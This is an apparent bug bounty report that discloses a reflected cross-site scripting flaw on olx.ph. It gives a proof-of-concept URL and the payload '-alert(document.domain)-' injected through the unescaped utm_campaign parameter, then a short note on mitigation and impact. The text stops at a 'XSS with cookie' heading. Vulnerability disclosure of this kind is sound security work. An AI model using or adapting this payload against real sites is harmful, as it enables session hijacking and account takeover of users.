Summary:

Hello,

I would like to report a reflective  XSS  at [https://www.olx.ph](https://www.olx.ph).

## Steps to reproduce
* Visit the following link: [https://www.olx.ph/all-results?q=car&utm_source=Opt_Homepage_Var_0&utm_medium=Search&utm_campaign=toto%27-alert(document.domain)-%27](https://www.olx.ph/all-results?q=car&utm_source=Opt_Homepage_Var_0&utm_medium=Search&utm_campaign=toto%27-alert(document.domain)-%27)
* An XSS should pop-up

{F305078}

## Technical Details
The paramter ```utm_campaign``` don't escape single quote ```'``` that's why the following payload to work: 
```
'-alert(document.domain)-'
```
Please note that the parameter value is  reflected  29 times, 4 times inside JS code, variables were using single quotes.

{F305079}
{F305080}

## Mitigation
Correctly escape and sanitize user input.

## Impact

Session Hijacking and everything related / controlled by JS that could lead to account takeover...

## XSS with cookie:
